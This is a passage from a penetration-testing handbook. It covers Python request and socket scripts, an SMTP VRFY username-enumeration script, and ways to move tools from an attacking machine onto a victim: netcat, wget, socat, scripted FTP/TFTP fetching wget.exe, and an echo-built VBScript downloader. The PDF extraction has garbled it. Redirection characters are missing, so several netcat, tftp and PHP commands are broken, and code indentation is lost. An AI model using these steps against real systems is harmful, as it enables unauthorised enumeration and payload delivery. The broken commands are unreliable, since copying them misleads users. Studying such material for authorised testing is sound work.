those files by entering the z drive.
You enter the z-drive by doing this:
C:\>z:
Z:\
# Now we switch back to c
Z:\>c:
C:\
Remove a network drive - umount it
First leave the drive if you are in it:
52
CMD
c:
net use z: /del
References and Stuff
This might come in handy for the linux-users:
http://www.lemoda.net/windows/windows2unix/windows2unix.html
53
Scripting With Python
Scripting With Python
Scripting With Python
There are many high-level scripting languages that are easy to use. One really popular one is Python.
54
Python Fundamentals
Python Fundamentals
Python fundamentals
Array/list
my_list = [1,"string",3,4,5]
for item in my_list:
print item
# Append/push to list
my_list.append("addMe")
Modules
Always good to modular your code.
module1.py
def addNumbers(numberOne, numberTwo):
return numberOne + numberTwo
script.py
import module1
total = module1.addNumbers(1,2)
print total
Pip - package management
Pip is the python package manager. It ca be used to download other modules.
Install pip
sudo apt-get install python-pip
To install package
pip install package
55
Useful Scripts
Useful Scripts
Useful Scripts
Make Request
Sometimes we might want to make a request to a website programmatically. Instead of having to visit
the page in the browser. In Python we can to it the following way.
If you don't have the module requests installed you can install it like this.
pip install requests
import requests
req = requests.get("http://site.com")
print req.status_code
print req.text
Custom headers
We might receive a 403 error if we don't include a user-agent. Or we might want to send a specific
header. We can do that the following way.
import requests
headers = {
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
"Accept-Encoding": "gzip, deflate, sdch",
"Accept-Language": "en-US,en;q=0.8,es;q=0.6,sv;q=0.4",
"Cache-Control": "max-age=0",
"Connection": "keep-alive",
"Cookie": "_gauges_unique_hour=1; _gauges_unique_day=1; _gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1"
"Host": "docs.python-requests.org",
"If-Modified-Since": "Wed, 03 Aug 2016 20:05:34 GMT",
"If-None-Match": 'W/"57a24e8e-e1f3"',
"Referer": "https://www.google.com/",
"Upgrade-Insecure-Requests": "1",
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36"
}
req = requests.get("http://site.com", headers=headers)
print req.status_code
print req.text
If you need to add an action, like loggin in or something like that, to your request you do the
following:
values = {'action' : 'whatever'}
req = requests.get("http://site.com", data=values, headers=headers)
56
Useful Scripts
Here is the documentation
http://docs.python-requests.org/en/master/user/quickstart/
Read and write to files
Many times we want to read through files and do stuff do it. This can of course be done using bash
but we can also do it in python. It might be easier to parse text in python.
file_open = open("readme.txt", "r")
for line in file_open:
print line.strip("\n")
if line.strip("\n") == "rad 4":
print "last line"
Send requests to your proxy (like Burp)
import os
os.environ['HTTPS_PROXY'] = ':'
# http://127.0.0.1:8080 if it is burp
# Then you need to add verify=False
requests.get("https://google.com", headers=headers,verify=False)
Basic banner-grabber
Here is an example of the most basic usage of the socket module. It connects to a port and prints out
the response.
#!/user/bin/env python
# Importing the socket module
import socket
# We use the socker() method of the module socket and store it in the variable s.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Here we use the connect method of the socket we created. The two arguments are pretty self-explanatory
# The first is the adress the second is the port.
s.connect(("192.168.1.104", 22))
# Here we save what the socket reviewed in the variable answer.
answer = s.recv(1024)
print answer
# Send stuff. REMEMBER THE \r\n
s.send("this is my message\r\n")
print s.recv(1024)
# Here we close the socket.
s.close
If you need to check all 65535 ports this might take some time. If a packet is sent and recieved that
makes it 65535 seconds, it translates into about 18 hours. So to solve that we can run the a function in
57
Useful Scripts
new threads.
from multiprocessing.dummy import Pool as ThreadPool
pool = ThreadPool(300)
results = pool.map(function, array)
Read more about parallellism here: http://chriskiehl.com/article/parallelism-in-one-line/
Connecting to SMTP
A crappy script to connect to a smtp-server and if you are allowed to test for users with VRFY it goes
ahead and test for the users that you input from a file.
One very important thing to note here, that had me stuck for quite a while is that you need to send the
query strings in raw-format
The \r here is fundamental!!
s.send('VRFY root \r\n')
#!/usr/bin/python
import socket
import sys
import time
import re
ips = [
"192.168.1.22",
"192.168.1.72"
]
users = ["root"]
userfile = open("/fileWithUsernames.txt", "r")
for line in userfile:
user = line.strip("\n")
users.append(user)
for ip in ips:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, 25))
banner = s.recv(1024)
print "****************************"
print "Report for " + ip
print banner
s.send('VRFY root \r\n')
answerUsername = s.recv(1024)
answerAsArray = answerUsername.split(" ")
if answerAsArray[0] == "502":
print "VRFY failed"
if answerAsArray[0] == "250":
58
Useful Scripts
print "VRFY command succeeded.\nProceeding to test usernames"
for username in users:
time.sleep(5)
s.send("VRFY " + username + "\r\n")
answerUsername = s.recv(1024)
answerUsernameArray = answerUsername.split(" ")
print answerUsernameArray[0]
if answerUsernameArray[0] == "250":
print "Exists: " + username.strip("\n")
else :
print "Does NOT exist: " + username.strip("\n")
if answerAsArray[0] == "252":
print "FAILED - Cannot verify user"
else:
"Some other error or whatever here it is: \n" + answerUsername
s.close()
Client/Server using sockets
http://programmers.stackexchange.com/questions/171734/difference-between-a-socket-and-a-port
59
Transferring Files
Transferring Files
Transferring Files
This section could easily be put in the post-exploitation section. But I consider this knowledge so
fundamental that I chose to put it here.
60
Transfering Files on Linux
Transfering Files on Linux
Transferring Files on Linux
Set Up a Simple Python Webserver
For the examples using curl and wget we need to download from a web-server. This is an easy way
to set up a web-server. This command will make the entire folder, from where you issue the
command, available on port 9999.
python -m SimpleHTTPServer 9999
Wget
You can download files using wget like this:
wget 192.168.1.102:9999/file.txt
Curl
curl -O http://192.168.0.101/file.txt
Netcat
Another easy way to transfer files is by using netcat.
If you can't have an interactive shell it might be risky to start listening on a port, since it could be that
the attacking-machine is unable to connect. So you are left hanging and can't do ctr-c because that
will kill your session.
So instead you can connect from the target machine like this.
On attacking machine:
nc -lvp 4444  file
You can of course also do it the risky way, the other way around:
So on the victim-machine we run nc like this:
nc -lvp 3333 > enum.sh
And on the attacking machine we send the file like this:
nc 192.168.1.103  file.sh
Socat
Server receiving file:
server$ socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt
client$ socat -u FILE:test.txt TCP:127.0.0.1:9876
Server sending file:
server$ socat -u FILE:test.dat TCP-LISTEN:9876,reuseaddr
client$ socat -u TCP:127.0.0.1:9876 OPEN:out.dat,creat
With php
echo "" > down2.php
Ftp
If you have access to a ftp-client to can of course just use that. Remember, if you are uploading
binaries you must use binary mode, otherwise the binary will become corrupted!!!
Tftp
On some rare machine we do not have access to nc and wget, or curl. But we might have access to
tftp. Some versions of tftp are run interactively, like this:
$ tftp 192.168.0.101
tftp> get myfile.txt
If we can't run it interactively, for whatever reason, we can do this trick:
tftp 191.168.0.101  ftp.txt
echo USER asshat>> ftp.txt
echo mysecretpassword>> ftp.txt
echo bin>> ftp.txt
echo GET wget.exe>> ftp.txt
echo bye>> ftp.txt
Then run this command to connect to the ftp
ftp -v -n -s:ftp.txt
Of course you need to have a ftp-server configured with the user asshat and the password to
mysecretpassword.
TFTP
Works by default on:
Windows XP
Windows 2003
A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003.
What is good about TFTP is that you can use it non-interactively. Which means less risk of losing
your shell.
Kali has a TFTP server build in.
You can server up some files with it like this
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
Now you can put stuff in /srv/tftp and it will be served. Remember that TFTP used UDP. So if
you run netstat it will not show it as listening.
64
Transfering files on Windows
You can see it running like this
netstat -a -p UDP | grep udp
So now you can upload and download whatever from the windows-machine like this
tftp -i 192.160.1.101 GET wget.exe
If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-
interactive way.
tftp 192.160.1.101
GET test.txt
I usually put all files I want to make available in /srv/tftp
If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the
IP like this:
grep 192.168.1.101 /var/log/syslog
VBScript
Here is a good script to make a wget-clone in VB.
If it doesn't work try piping it through unix2dos before copying it.
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs